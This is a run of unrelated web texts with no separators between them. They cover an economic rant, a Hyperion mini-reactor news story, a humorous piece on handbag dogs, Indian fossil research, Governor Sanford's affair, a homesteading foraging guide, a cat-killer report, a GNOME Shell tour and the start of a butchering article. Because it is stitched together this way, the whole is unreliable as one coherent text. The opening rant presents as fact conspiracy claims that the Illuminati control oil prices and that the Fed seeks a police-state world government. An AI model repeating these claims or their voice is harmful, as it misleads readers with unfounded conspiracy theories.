China and Russia are in a very poor position monetarily , at least as bad as Europe and the US , perhaps even worse .
They have no business pushing their weight around when they their gold reserve holdings are inconsequential .
So what if they are creditors .
The debts owed to them are denominated mostly , or at least substantially , in dollars , which are becoming ever more worthless as Emperor Obama throws lavish dollar bailout parties for the rich bankers and the social welfare recipients , while the middle class and non-anointed upper class , which could reduce the ensuing inflation caused by these lavish dollar parties via increased production , are given token relief .
China has tens of millions of young men out of work , and if the US dollar , US treasuries and US economy go down , and inflation shows its ugly head due to dollar dumping and / or US treasury - shunning , we can assure you that the US consumers ' demand for Chinese goods will drop off a cliff .
You have n't seen anything yet when it comes to reductions in consumer demand .
Wait until hyperinflation and double digit interest rates hammer the world economy .
When the US consumer finally goes south for the last time , this will put tens of millions more out of work in China , and there will be violence and revolution if that happens .
De-coupling is a myth that has been thoroughly shattered .
While China is in a dollar trap , Russia is in an oil trap .
The Illuminati still control the price of oil , so Russia is at their mercy as well .
There recent financial market experience was an absolute disaster as oil tanked .
Their markets were a shambles , and had to be closed down many times to stop panic selling and to control speculative short - selling .
They had to spend down a large portion of their reserves to support the ruble and their financial markets .
They are hardly in a position to dictate terms regarding a world currency .
If they try to bully Europe with natural gas , this will backfire .
The price of oil will then drop to $ 15 a barrel .
Why are we paying interest to the Fed on money that is being created out of thin air to save the privately owned Fed itself , as well as its member institutions , which are receiving interest themselves from the Fed on the taxpayer money being loaned to them to shore up their balance sheets so they can continue to function without being shut down ?
We 're paying interest while they 're earning interest ?
Does that sound fair to you ?
Talk about moral hazard !
And these are the same institutions that have conspired with the Fed to destroy our financial system to make way for a one world government , which is a euphemism for an Orwellian police state .
We are certainly not paying this interest to ourselves as the media morons would have us believe , but to the anointed Illuminist financial institutions , which continue to privatize profits even while losses are being socialized to bail them out .
The common and preferred stock which taxpayers own in these companies is worthless , a fact which is being covered up and hidden from investors by use of deceitful financial statements that allow assets , with the blessing of our " regulators , " to be carried at mark - to - model values , meaning that these assets are whatever the criminal zombie financial institutions say they are .
Hyperion Power Generation today has no product or service .
It certainly does n’t have a plant .
Yet , the Denver company is valued at an astonishing $ 100 million by investors , and its books boast a whopping 70 orders for what it plans to manufacture — small nuclear reactors .
Unlike large reactors in nuclear power plants that cost billions of dollars , Hyperion ’s reactors will sport a relatively modest price tag of $ 25 million to $ 30 million apiece .
“ We are four years away from putting the first reactor in the ground , ” said Hyperion CEO John “ Grizz ” Deal , sporting the optimism of many chief executives .
But Deal ’s forecast may be a bit sunny .
The Nuclear Regulatory Commission says it could take years before it approves the design safety of mini-reactors .
“ I ca n’t comment on Hyperion ’s business projections , but the certification and approval of the ( small reactor ) design will take several years , ” said NRC spokesman John McIntyre .
In reality , even a typical large reactor has not been built in the United States in more than three decades .
And there is the perennial controversy about where companies can store spent fuel rods .
McIntyre said NRC ’s staff of 3,600 is busy reviewing the applications for 26 proposed large reactors .
The nation already has 104 that are operational .
Hyperion ’s business plan calls for construction of up to eight manufacturing plants across the world .
It is pursuing joint - venture talks in Eastern Europe , Asia and Australia .
In the U.S. , New Mexico and Idaho are dangling tax breaks and other incentives to land a plant , Deal said .
Each plant could cost about $ 100 million .
If up and running , the plants , combined , could build 1,000 reactors per year , he said , capturing a slice of the estimated $ 70 billion global market .
“ Small reactors are very attractive in developing countries such as Vietnam that do n’t have infrastructure such as transmission lines to support big power plants , ” said Felix Killar , senior director of fuel supply and material licensees at the Nuclear Energy Institute , which represents the industry .
Hyperion would ship the reactors from its plants to enrichment facilities to be fitted with uranium hydride fuel rods .
The reactors can’t blow up , melt down or be used to make weapons , Deal said .
The 6 - foot - by - 10 - foot reactors could be carted on flat - bed trucks and buried several feet underground .
Each reactor could generate enough heat to power 20,000 homes in the U.S. or purify water for scores of villages in West Africa .
“ It certainly is an optimistic plan , ” Killar said .
“ It can be completed , provided Hyperion can do a good job of laying out the technical basis of their nuclear reactors to the commission .
“ The commission always assumes accidents could occur and wants to know how the company could minimize that eventuality and any adverse impact on the public . ”
Dressed in a Hawaiian shirt and shorts , as is his custom when he ’s not meeting investors or potential customers , Deal hardly looks the head of a company that plans to sell nuclear reactors .
“ I was a left - wing nut bag , anti-nuke liberal until 10 years ago , ” he said , stroking Nala , a wrinkly - faced Shar - Pei at his feet ( the two dozen Hyperion employees at its Cherry Creek office can bring pets to work ) .
“ Then I became educated about nuclear .
I still am a liberal , but I do n’t see how we can implement our climate - change policies and reduce carbon if we do n’t use nuclear power for base - load plants . ”
Base - load plants run 2 4/7 , continuously generating electricity .
Coal typically is used as fuel in these plants , but burning it emits carbon dioxide , the most common greenhouse gas .
Wind and solar plants are carbon - free , much like nuclear plants , but today they can not run round - the - clock .
Wind does n’t always blow , nor does the sun always shine .
Deal credits his education to scientists at the Los Alamos National Laboratory in New Mexico who developed the mini-reactor technology .
He moved to Hyperion from a job at the lab where he worked on technology transfer .
Hyperion ’s largest shareholder —
Denver venture capital fund Altira — licensed the technology from the lab three years ago and brought Deal onboard to put together the company .
“ Hyperion ’s reactors can be used in oil shale fields , at military bases and in remote communities , said Dirk McDermott , managing partner at Altira .
“ The company will grow quickly . ”
For now , Hyperion is focused on raising money .
Deal returned to Denver last Thursday after visiting Houston , Albuquerque and two East European countries — all in seven days .
He says he ’s applying for federal stimulus money “ like everybody and their brothers up and down the Rio Grande ” to translate the Hyperion vision into reality .
“ The technology is not a challenge ; the regulation is not a challenge , ” he said .
“ For us , the only challenge is how fast can we move , how can we scale it to meet the large demand . ”

Colorado finally makes a call
John Deal , the CEO of Hyperion Power Generation , says he has sat down twice with Gov. Bill Richardson of New Mexico to discuss the company .
Colorado ’s neighbor is competing with Idaho to attract Hyperion ’s first U.S. manufacturing plant for small nuclear reactors , Deal said .
But he has never met or talked to Gov. Bill Ritter , although the company has been headquartered in Denver for three years .
“ We have tried to reach the governor ’s office , ” Deal said recently .
“ They wo n’t talk to us .
They wo n’t return our phone calls . ”
Todd Hartman , spokesman of the Governor ’s Energy Office , said the administration has “ no clear record of contacts from the company . ”
“ That said , we will be reaching out to them and would definitely be interested in talking to them , ” he said .
Deal said Tuesday that he had received a call from Don Elliman , executive director of the Colorado Office of Economic Development and International Trade , after The Denver Post made inquiries .

Cell phone ? ... Check .
Chihuahua ? ... ummm Check !
Did you ever think that one day we would be considering our pets a fashion accessory ?
Turns out that it has become normal in some circles to take your dog for a walk and the animal does no walking at all .
You do n't have to be strolling the red carpet to purse your miniature K - 9 anymore .
Apparently it 's now socially acceptable to walk just about anywhere and have glazed eyes , a long tounge and a fur covered head bobbing out of your handbag .
It may seem silly , but you are clearly making a statement when something that you are wearing happens to be a living breathing animal .
But what exactly is that statement ?
A bit of history can clue us in ...
An Historic Pastime !
Oddly enough the practice of carrying your dog in a handbag goes back to Ancient Rome .
Elite women would put their tiny Maltese 's in a sleeve when walking throughout the streets .
Another name for the Maltese dog in Rome was ' the Roman Ladies ' Dog ' and the breed became a physical symbol of loyalty .
Today the Maltese ( that 's the small white fluffy one pictured right for those less aquainted with dog breeds ) is still a popular ' carry dog ' with women .
Now you can see a Maltese hung round a hot girl 's waist while she goes for a power walk on the beach .
Another early ' carry - dog ' was the Pekingese lapdog , bred in ancient China to fit inside the sleeves of a man 's robe .
So it has n't always just been women that have an obsession with carrying around small dogs .
Through recent centuries a wider variety of ' lap dogs ' became popular among royalty and the rich .
Nowadays there is a diverse range of small pooches that have become fashionable ' handbag dogs ' .
Today a dog in a bag still screams out loud that you have a financial status that compares to few .
Who else could afford to risk destroying their handbag and all it's contents with Poodle piddle , not to mentions the high costs to buy and maintain these animals ?
Who would have thought that millions of years of evolution would see certain breeds of dogs in some weird symbiotic class - status relationship with humans .
The fad of carrying a bow - wow under your arm has been here for centuries and is n't going anywhere soon !
But is lugging a turd producing mutt around town really worth it ?
Let 's weigh up the options ...
Dog in a Bag Pros
No need to pick up your dog 's crap in the street , it goes straight in the bag .
You can wear animal fur and animal rights activists can't say a thing .
People know you 're a lady with money to burn .
It 's harder to lose a handbag that barks .
It 's a good conversation starter .
Your bag has a deterrent with teeth for curious theiving fingers .
If you bump into Paris Hilton in the street she might comment on your dog- handbag - coolness and become your best friend .
If you talk to yourself in the street you wo n't look so crazy , people will just think you are talking to your dog .
You can get away with taking your dog into a shop , how cool is that !
Carrying that extra lump in your bag will help you burm more calories and lose weight .
Dog in a Bag Cons
You look like a dick !
Other dog - obsessed idiots will want to talk to you , or if you 're lucky they 'll just smile and stare .
Dog suffocation risk .
You 're out of luck if you have a cat / ferret / fish / lobster etc. ( actually , maybe you could keep a lobster in a handbag ... but what if it snips the strap ?!? )
An expensive mutt may make your handbag more of a target to thieves and there 's a shortage of pet detectives .
You might not do so well in that job interview .
Paris Hilton might become your best friend .
The dog will think it 's the pack leader and your it 's bitch .
Just ask the Dog Whisperer .
Your dog might chew your expensive designer handbag .
If you 're really unlucky it might try to make sweet doggie love to it .
You 'll need a big bag for that German Shepherd .
Still undecided ?

Early example of multicellular life discovered in Vindhyan hills .
Once thought to be the fossils of shelled creatures , these features are actually the marks of gas bubbles trapped in bacterial mats .
S. Bengtson et al
A decade - old dispute over the authenticity of Indian fossils that are some of the earliest examples of multicellular life seems to have been resolved .
As a result , an Indian researcher has been cleared of simmering suspicions of specimen tampering .
The controversy began when palaeontologist Rafat Azmi of the Wadia Institute of Himalayan Geology in Dehra Dun reported in 1998 that he had found shell - like fossils in rocks from the Vindhyan mountain chain in central India that dated to 1.6 to 1.7 billion years ago1 .
Uproar followed , because the finding suggested that animal forms had evolved much earlier than previously believed .
Shelled creatures are thought to have first evolved at the beginning of the Cambrian ' explosion of life ' around 550 million years ago .
In 2000 , the Geological Society of India , based in Bangalore , sent a team to the site , but could not verify Azmi 's initial report .
When the society 's journal subsequently wrote that Azmi 's study was " far from convincing " , media reports accused him of faking the fossils — damaging his career , Azmi says .
But research published this week in the Proceedings of the National Academy of Sciences2 reinterprets the fossils in question as traces of algae and bacteria .
The purported shell - like fossils are , the authors claim , the marks of gas bubbles trapped in bacterial mats .
The samples also contain fossilized remains of filamentous algae , confirmed to be about 1.6 billion years old and possibly the earliest example of a multicellular eukaryote yet found .
Similar algae had already been found in rocks dating from 400 to 600 million years later than the Vindhayan samples , but despite claims of older examples their existence before that time had remained an open question .
The samples " represent an exquisitely preserved biota of cyanobacteria and multicellular eukaryotes , previously unknown from such old rocks " , says Stefan Bengtson , a palaeozoologist at the Swedish Museum of Natural History in Stockholm , who led the study .
" It 's a remarkable window onto ancient life , opened thanks to Dr Azmi . "
" I see no evidence of fraud , " he adds .
" Science often progresses by the need to test ' crazy ' ideas .
If Azmi had not insisted on his ' Cambrian ' fossils , we would not have known about this remarkable biota .
He definitely did n't deserve being branded as a fraud in the Indian media . "
Martin Brasier , a palaeobiologist at the University of Oxford , UK , was n't involved in the research but has followed the debate since Azmi 's original paper was published .
He says the new study clears the way through the accusations to concentrate on interpretations of the fossils and their preservation .
" This is what the original debate was all about , " says Brasier .
" The evidence is starting to show there were no animals in ' deep time ' .
The Cambrian explosion of animals after 550 million years ago was a real evolutionary event — like an avalanche in evolution . "

Azmi says that the Geological Society of India now " has a moral duty to retract what they wrote about my work " , noting that their accusations had " delayed the whole process of confirmation for nearly a decade " .
The society 's vice president , geologist S. V. Srikantia , says that a retraction cannot be based on the results of research published in other journals .
" It is for Azmi to prove he was right , " he told Nature .
Corrected : S. V. Srikantia said that a retraction cannot be based on the results of research published in other journals ; not ' on the results of foreign researchers ' , as was previously stated .
South Carolina Gov. Mark Sanford gestures as he gives his State of the State address in South Carolina Sanford admits affair
South Carolina GOP Gov. Mark Sanford admitted Wednesday to an affair , and resigned his position as chair of the Republican Governor 's Association following a strange week in which the governor dropped off the grid and could not be located .
Later in the day , Sanford 's wife Jenny released a statement saying the couple had begun a trial separation two weeks ago .

“ I have been unfaithful to my wife .
I developed a relationship with what started out as a dear , dear friend from Argentina , ” Mark Sanford said in a rambling and often emotional news conference at the state capital in Columbia .
“ I ’m a bottom line kind of guy I ’m just gonna lay it out .
It ’s gonna hurt and I ’m going to let the chips fall where they may , ” said Sanford , often touted as a potential 2012 presidential hopeful .
Sanford apologized to his wife and his four children .
“ To Jenny , anybody who has observed her over the last 20 years of my life knows how closely she has stood by my side in campaign , after campaign , after campaign , ” he said .
“ I ’ve let down a lot of people , and that ’s the bottom line , ” he said .
Asked if he and his wife had separated , Sanford responded , “ I do n’t know how you want to define that .
She ’s there , I ’m here . ”
“ What I did was wrong , period , ” he said .
“ I spent the last five days crying in Argentina . ”
Jenny Sanford was much less vague , saying that after learning of her husband 's infidelity and first working " to reach reconciliation through forgivness , " she had asked her husband to leave earlier this month .
" We reached a point where I felt it was important to look my sons in the eyes and maintain my dignity , self - respect and my basic sense of right and wrong , " she said in her statement .
" I therefore asked my husband to leave two weeks ago . "
Jenny Sanford said the terms of the " short " trial separation called for the governor not to contact his family , so she was unaware of his whereabouts during the past week .
The governor said that his staff did not deserve blame for giving misleading statements about his whereabouts to the press - first that he was off writing and then that he was hiking the Appalachian Trail .
" I apologize to my staff , " Sanford said in a statement released after the 2 p.m. news conference .
" I misled them about my whereabouts , and as a result the people of South Carolina believed something that was n't true .
I want to make absolutely clear that over the past two days at no time did anyone on my staff intentionally relay false information to other state officials or the public at large .
What they 've said over the past two days they believed to be true , and I 'm sorry to them for putting them in this position . "
Soon after the press conference ended , the RGA announced that Mississippi Gov. Haley Barbour - another potential 2012 candidate for the GOP - would be stepping in to fill Sanford ’s previous role as chairman .
“ The news revealed today hurts all of us who have gotten to know Governor Sanford over the years and so it is with regret that the RGA accepted Governor Sanford ’s resignation as chairman , ” Barbour said in a statement .
“ While this news is deeply disappointing , I also know it ’s important to remain focused on the future and Governor Sanford ’s resignation allows him and us to do just that . ”
Sanford 's announcement was the latest twist in a story that began as a mystery but now has turned into a fiasco for Sanford , whose staff provided a series of increasingly confusing cover stories when his whereabouts became the subject of global news coverage .
“ I do n’t know how this thing got blown out of proportion , ” the governor told The State newspaper of Columbia , S.C. , after he landed at the Atlanta airport Wednesday morning .
Sanford , a conservative Republican who had a promising future in national politics , is now not only the butt of jokes but has serious questions to answer about the bizarre series of events .
Some of Sanford ’s critics attacked the governor for making no arrangements for executive decisions in his absence , such as mobilizing the National Guard in case of catastrophe or advocating for the state with Washington if an emergency struck the coast .
Journalists covering the story had nearly universal doubts about the narrative put out by his office .
The trail on the governor went cold at the Atlanta airport , which is not a logical place to go to start hiking the Appalachian Trail .
The State said in a story posted around 8:30 a.m. that Sanford had arrived Wednesday morning at Atlanta ’s Hartsville - Jackson International Airport after what he says was an extended visit to Buenos Aires .
When the story first broke Monday , both Sanford ’s staff and his wife said the governor had taken leave to do some writing and needed to get some time “ to get away from the kids ” after the conclusion of a contentious legislative session .
Then on Monday night , Sanford ’s staff sought to clear up the matter by offering a plausible explanation for why he might be out of contact with his office — the governor was hiking the Appalachian Trail .
But his office declined to state his location on the approximately 2,175 - mile trail .
As it turns out , Sanford explained Wednesday that he decided to do “ something exotic ” and take an extended trip to Buenos Aires .
Asked by The State why his staff and wife said he was on the Appalachian Trail , Sanford responded “ I do n’t know . ”
The governor added that “ in fairness to his staff ” he told them that he might go hiking on the Appalachian Trail .
Since Monday , the story has been driven by some of Sanford ’s harshest critics in the state , including Republican state Sen .
Jake Knotts and Republican Lt. Gov. Andre Bauer .
Asked for his response Thursday on MSNBC to the news that Sanford had been in Argentina and not hiking on the Appalachian Trail , Knotts said , “ Coverup , coverup .
Lies , lies , lies .
His staff lied — they did n't know where he was .
I do n't believe a word that comes out of that office . ”
Issue # 47 • September / October , 1997
Most homesteaders and country dwellers forage a little .
It might be hunting for morels in the spring , berries in the summer , or boletes in the fall .
Some forage salads , some go looking for a supply of autumn nuts for their holiday baking .
The hardcore forager does all this and more .
When a visitor to your garden compliments you on your chenopodium as well as your tomatoes , you know he ’s a hardcore forager .
Where you see a blaze of summer beauty in a stand of day lilies , the hardcore forager sees fritters and cooked buds and a salad made with the tubers .
A lake fringed with cattails is liable to bring paroxysms of joy in the hardcore forager .
There are flour , vegetables , and even something for the pickle crock there , not to mention a meat course of fish or frog legs .
Experienced foragers see food , medicine , and other useful things in every forest and field .
Day lily
A reliable guide book
Becoming a hardcore forager is not difficult .
It takes a fair amount of time to learn the basics of foraging , then a lifetime of honing those basic skills .
The first thing to do is to find a reliable guide book to learn which plants are good for what .
The classic in the field isStalking The Wild Asparagus , by the late Euell Gibbons .
He originally published it in 1962 , and Gibbons ’ love of the wilds ( and wild foods ) still shines forth 34 years later .
The line drawings are very clear and make recognition easy .
The recipes will get the novice wild - foods cook off to a good start .
Stalking The Wild Asparagusis available from Storey Communications , Schoolhouse Rd. , Pownal , VT 05261 .
Another basic manual of identification and use of wild plants is The Wild Food Trail Guideby Alan Hall .
Sadly , this book is out of print .
It might be found in used bookstores , or your library may be able to get you a copy via inter-library loan .
This is a more compact book than Gibbons , but it has excellent indices , listing plants by use and season of availability .
The section of potentially harmful look - alikes is also very handy .
Oddly enough , the little Golden Nature Guides are useful for identification as well .
While there is n’t one on edible plants specifically , the one on flowers and the one on weeds both have excellent pictures for identifying your targets .
The various guide books with photographs do n’t seem to be as useful .
Sometimes it ’s hard to see the plant in question in the photograph .
A clear line drawing is your best bet .
Now you have your book and you ’re ready to go .
Almost .
Book in hand , take a stroll in the backyard .
Try to identify the edible wild plants right outside your back door .
Odds are you ’ll have no trouble finding half a dozen or so .
The most likely are dandelion , chicory , amaranth , rumex , chenopodium , and milkweed .
These , along with cattails , are the most common edible plants in America .
When gathering wild plants , try to take only what you need .
For example , if you ’re gathering chenopodium leaves for supper , just clip off the leaves , not the whole plant .
While it may be more convenient to take the plant and separate the leaves at home , by only taking some of the leaves from each plant , you ensure that you ( and other foragers ) will have a new crop in a few weeks .
There are some plants that you end up destroying while gathering , though .
These include spring beauties , day lilies ( when digging the tubers ) , and Jerusalem artichokes .
Some patches can be heavily harvested , some should be left alone .
Always be sure to leave enough for the next generation of plants to grow .
Tools
The question , once you ’ve found your plants , is what to do with them .
For gathering plant foods , you ’ll need some basic tools .
A good qualitytrowelis necessary for digging out roots and tubers .
Avoid the cheap ones stamped out of sheet metal .
They soon bend and break under steady use .
A trowel with a solid shaft and a wooden or metal handle is well worth the investment .
A pair ofkitchenshearsis good for cutting leaves , etc. , from the main plant .
These can be had for relatively little at any kitchen store .
Apocket knifeis handy for a multitude of purposes .
Avoid the cheap knives and invest in a good one .
It does n’t hurt to check the clearance shelves at the local discount store .
A recent visit to Wal - Mart revealed Victorinox Bantam models ( single blade , can opener , bottle opener , screw driver , wire stripper , key chain , tweezers , and toothpick ) for $ 2.50 .
The original price was $ 6.97 .
A fistful of quart or gallon sizesealable plastic bagswill help you get your treasures home .
This all can go into your pockets or afanny pack .
If an extended gathering trip is planned , aknapsackor haversack can be used to keep your hands free .
On shorter trips , anet shopping bagcan be stuffed into a corner to help cart home the loot .
Safety
When gathering wild foods , be aware of the area you are working in .
It is wise to avoid roadsides .
Auto exhaust contains various compounds that can collect in roadside plants .
These are not substances that you want to eat .
Also , runoff from roads usually includes oil and gasoline .
This is not anything you want to eat , either .
Be careful of wild plants along cultivated fields .
Some farming practices include the use of a variety of herbicides and pesticides that you definitely do not want to bring home .
Dandelion
Once you ’ve identified your plants , and have a safe place to harvest them from , go out and get some .
In general , the young leaves are milder in flavor and more tender .
Gather those instead of the older leaves .
At first , take only enough for a sample .
This is a reasonable precaution , since you cannot be sure if you ’ll like the flavor , or if the plant will agree with your system .
A good example is the Jerusalem artichoke .
The root of a sunflower ( Helianthus tuberosus ) containsinulin , a chain of fructose molecules .
Inulin is the same thing that causes flatulence from beans .
But where beans are 10 - 15 % inulin , Jerusalem artichokes are as much as 50 % inulin .
Therefore , eating them can cause flatulence , in some cases terribly painful flatulence .
So do n’t eat a large helping of them until you know exactly how they react with your body .
Day lily tubers can have the same effect .
The general rule is toavoid plants that have milky sap .
The exceptions to this are dandelion and milkweed .
To be safe to consume , the plant must not irritate the skin .
A rough and ready allergy test is to scratch the inside of your elbow and apply a bit of the plant in question .
Hold it in place with a bandage for 24 hours .
If there is a reaction ( swelling , redness , etc. ) , then you may be allergic to that plant .
Do not eat it .
If it passes the allergy test , eat asmallsample .
A few leaves will be enough .
If there are no ill effects within ten hours , then that plant is safe for you to eat .
This is a bit of a rigmarole , but it is necessary for your safety and well - being .
Preparing wild foods
Once you ’ve determined that the plants you have collected will not cause you any undue difficulty , you need to prepare them .
Milkweed , dandelion , and rumex , for example , all contain various bitter components that must be removed before eating .
The easiest way to do this is to put the plant material in boiling water , boil it for a few minutes , drain , and repeat .
Do this two or three times .
The last time , cook until tender .
The various greens all have their own flavors , and can be combined to make interesting dishes .
They may be used as one would use spinach .
Amaranth greens are used in making a cream soup .
Rumex can make an excellent sauce for pork or duck .
The young leaves of dandelion , rumex , and chicory are very tasty when cut up into a salad with iceberg lettuce .
They tend to be bitter , but this bitterness is much less in young leaves and works well with the bland lettuce .
Use your imagination , read your cookbooks , and you ’ll find many niches in your diet for wild plants .
They not only provide greens ( these are the most common and easiest to gather ) , but a variety of cooked vegetables , seeds for flour and porridge , items for the pickle crock , and a number of seasonings and thickeners .
Fish
Once you have gotten used to using wild plants , it ’s time to consider wild meats .
Probably the easiest to use and most readily available are fish .
Unless you live in a desert , there is fishing nearby .
The most common fish are the sunfish .
These include bream , bluegills , pumpkinseeds , warmouth , rock bass , and even the large mouth and small mouth bass .
Almost any pond or lake that has fish has sunfish , and they ’re easy to catch .
The ideal rig is an ultra - light casting rod and reel with four - pound test line and a number 8 or 10 hook .
A pencil bobber completes the outfit .
Bait can be red worms , leaf worms , meal worms , or wax worms .
I like wax worms because their tough skin allows them to be used to catch several fish .
Simply bait your hook , set your bobber so that the bait will more or less drop to the bottom , and cast .
The hook is weight enough to make the bait sink , but without detracting from a natural appearance .
Usually , the fish will take the bait while it ’s still sinking .
If not , let it sit for a few minutes , and then reel it in very slowly .
The movement will often provoke a strike .
Try for sunfish around piers and platforms , and in shallow weedy waters .
In some ponds , you ’ll find many short , thick fish .
These fish are stunted due to overpopulation , and every one that you catch should be kept .
This provides more room for the remaining fish to grow larger .
Even the very smallest sunfish are useful .
If too small to eat , they can always go into the garden as fertilizer .
This same fishing rig , with a slightly larger hook , can be baited with worms and used to catch bullheads and catfish .
Cleaning a multitude of small fish can be very time - consuming , so fillet them instead .
Each little sunfish will give two small fillets , about the size of a silver dollar .
They do n’t look like much , but dipped in a batter of beer and pancake mix , they puff right up .
This method of cooking avoids the many bones , and allows a little to feed a lot .
Small catfish and bullheads are good fried whole , or they can be smoked .
Either way , these fish are good eating .
Amaranth
Frogs
Frogs are another readily available wild meat .
Only the legs are eaten .
While bullfrogs are the most popular source of frog legs due to their size , any reasonably sized frog can be eaten .
Frogs can be taken a number of ways .
They are usually hunted at night , when they ’re most active .
Bare minimum equipment for frog hunting is a strong flashlight , assuming that your state allows lights for frogs .
By shining this light in the frogs ’ eyes , you dazzle them .
Keeping the light in their eyes , you can just pick them up .
Usually .
If you want to be a bit more sure about collecting your frogs , you can use a gig .
This is a four - or five - tined spearhead available at almost any sporting goods or discount store .
Fix it to a shaft , and spear the frog through the body .
Air guns , .22 ’s ( loaded with CB caps ) , and archery tackle can also be used for hunting frogs .
Of course , the meat on a frog is all on the legs .
Simply cut them from the body , slip the skin off , and cut off the feet .
The traditional way of cooking frog legs is frying .
Any coating can be used , from bread crumbs to cornmeal to commercial mixes .
Season your chosen coating to taste , dip the legs in the coating , then into beaten egg , and finally into the coating again .
Then fry until nicely brown in a little oil .
Turtles
Local waters may also offer a third meat for your table : turtles .
Terrapins and snapping turtles have graced many fine menus around the world , commanding high prices
These esteemed animals are yours for the taking .
Snapping turtles are large and rather vicious .
Certainly they fear little or nothing in their environment .
Therefore , caution should be used in handling them .
The heavy , beak - like jaws can sever a broomstick , or a finger , quite readily .
Snappers must be handled very carefully .
Usually , they can be carried by the tail , and neither the head nor the claws can get you .
Terrapins are easy to handle , since they tend to pull into their shells .
Simply grasp them by the sides .
Catching turtles is n’t hard at all .
The lazy man ’s way is to use jug lines .
A large fish hook is snapped onto a wire leader , and the leader is attached to a plastic jug by a length of line .
Chicken livers make a good bait .
These are then dropped into the pond or lake of your choice .
They can be left overnight , to be retrieved in the morning , or they can be tended from a boat during the night .
If you decide to leave them overnight , make sure that you have some way of retrieving them .
Another way to obtain your turtle is with a trap .
There are two basic traps .
The first is a barrel or other large container with bait inside and a ramp leading up to the edge .
This works best if the barrel is sunk about halfway into the water , with holes punched in the sides to allow the aroma of the bait to disperse .
The turtle climbs the ramp , falls into the barrel , and cannot climb out .
A variation of this trap uses a frame covered with hardware cloth , having metal sheathing around the top so the turtle ca n’t get out .
The other turtle trap is similar to a fish trap .
Hardware cloth is secured to a square frame to make a box .
On one side , a flattened funnel is made .
The turtle enters the trap and can not get out .
Bait for these traps can be fish or any other dead meat .
Preparing turtles
Preparing turtles is relatively easy .
Snapping turtles are best killed by chopping off the head .
Since they tend to stick out their heads when held by the tail , one person can hold the turtle up over the chopping block , and another can use an ax or hatchet to cut off the head .
The snapper should then be hung up to bleed out .
Once bled , the carcass should washed with plain soap and a stiff brush .
After cleaning , the tail can be skinned and the lower shell cut off .
The internal organs are all removed , preserving the liver and any eggs that might be present .
Be sure to carefully remove the gall bladder , the little green bag on the liver .
To make soup , the carcass , liver , eggs , and lower shell are put into a kettle with a bay leaf , some cloves , thyme , and allspice , covered with water , and simmered until the meat falls off the bones .
Then remove the turtle and let it cool .
When cool enough to handle , remove all the skin , bones , claws , and shell .
Chop the meat , liver , and eggs and return to the broth .
Sauté onions and garlic until translucent , add flour to make a roux , and finally add crushed canned tomatoes or tomato juice .
Simmer for a few minutes .
Add this mixture to the turtle meat and broth , bring to a boil , and serve .
Milk weed
If you want to use the meat in other ways , the turtle can be cleaned and simmered as described above , and then the meat can be used in salads , omelets , stir fry , or other dishes .
Smaller turtles are handled in a manner similar to crab or lobster , in that they are dropped into a pot of boiling water and cooked for 10 minutes or so .
The turtles should be scrubbed and rinsed before cooking .
Cleaning and use of the meat is the same as for the bigger turtles .
Crayfish
The final aquatic meat is the crayfish .
These little crustaceans look like miniature lobsters , and taste similar to shrimp .
They range across the country , in various species , and can be taken in several different ways .
Water - dwelling crayfish can be picked up by hand ( grasping them just behind the pincers to avoid a nip ) , caught in traps ( like fish traps or lobster pots ) , or hauled in with nets , or even strings baited with bacon rind .
Some live in low fields , tunneling down to the water level and leaving “ chimneys ” of mud .
These are most easily gathered at night when they prowl about for food .
In the South and in Hawaii , some live on crops and can be gathered as they travel between the fields and their homes .
Preparing crayfish is very easy .
Simply drop them into boiling water and let then simmer for about 10 minutes .
The water can be seasoned as for crab or shrimp .
The cooked crayfish are then removed and cooled under running water .
The tails can then be twisted off and the shell peeled away .
Slide a fingernail or knife along the midvein to clean out the muck , and your crayfish is ready to eat .
The cooked and cleaned tails can be served in the same manner as a shrimp cocktail , coated with cornmeal and fried , used in salads or stir fry , or however you would use crab or shrimp .
When gathering wild foods , whether plants or animals , always be sure that you are not breaking any laws .
Some areas , such as forest preserves and parks , have restrictions on gathering plants .
In some places , turtles and frogs are considered game animals and are regulated by law .
Check with your local conservation office to avoid violations .
If you are foraging on private land , get the land owner ’s permission .
Many land owners are happy to let someone come and pick “ weeds ” if that person acts responsibly .
Always forage only where given permission , and for the materials agreed upon .
You might find other foods while in the field , but the land owner may be saving them for himself .
Never leave a mess , and always leave farm gates as you find them .
Like hunters and fishermen , foragers have to make a good impression to keep private land open to use .
This is not the last word on foraging .
There probably will never be a last word .
People will continue to discover the delights and rewards of foraging for generations to come .
It helps us to appreciate what we have in the modern world , and to appreciate the wonder and diversity of nature .
A vicious killer loose in Palmetto Bay and Cutler Bay is believed to be responsible for the death and mutilation of over nineteen cats , most of them family pets .
The Human Society has issues a $ 2500 reward to individuals with information that can lead to the identification , arrest and conviction of the killer , according to CBS 4
Unsurprisingly , people who brutally murder animals for fun are not usually well adjusted in other areas of life .
Men who abuse animals are much more likely to abuse women .
While almost all serial killers have a history of torturing and viciously killing small animals .
The killer mutilates and skins the animals , and leaves them for their owners to find .
Because I feel a tad bit guilty about missing all of the Community Week sessions this week ( school and work training , and before you ask , I ’ve got more training all this weekend , so I ca n’t make those sessions either ) , I did decide to do a quick tour of the GNOME Shell , one of the integral parts of the GNOME 3 series , scheduled to be coming out in 2010 or so .
First , big thanks to Vincent Untz for packaging the GNOME Shell packages for openSUSE !
I ’m using these packages for my testing purposes
Here ’s the quick tour :
First , here ’s the openSUSE 11.1 desktop w/ GNOME 2.24 running GNOME
Shell :
Note the Activity menu and the specially - capulated notification area .
Good stuff .
I al so like the stylized panel , but I do n’t like it at the top .
When openSUSE adopts GNOME 3 , I ’d like to see it moved to the bottom .
Clicking on the Activity menu opens this menu .
The desktop shrinks into a side ( and you can create or remove as many as you wish , which is seriously awesome ) , and opens the most recent Applications and documents ( I think ) .
If you wish to open an application , double - click or drag the icon onto the desktop you wish it to open to .
Here I did a simple search for SUSE .
Applications and documents that matched that search pop up ( although I ’m not sure what indexing service that is , I ’m relatively sure it ’s not Beagle , openSUSE ’s desktop search indexer ) .
Here ’s an expanded view of the search for apps with SUSE .
The desktops slide out of the way , and a multi-column ( and page ) view pops up .
To open , drag an icon over to the right ( onto the desktop ) .
Overall , I like it .
Combined with the new stuff coming next year in GNOME 3 , this could be quite an interesting release .
One of the most important things to note is that this interface seems incredibly tailored toward netbook ’s small screens .
What do you think ?

Issue # 23 • September / October , 1993
Fall is butchering time , a period of joy in the harvest of the year ’s work and of sadness that the lives of your beautiful , healthy animals have come to an end .
On this occasion the animals should be treated with the same kindness and respect with which they were treated during their lives .
Good farmers raise their animals free from fear , anxiety and stress .
The animals should meet their end as they lived , without the terror of the slaughterhouse .
Making careful preparations will help you remain calm .
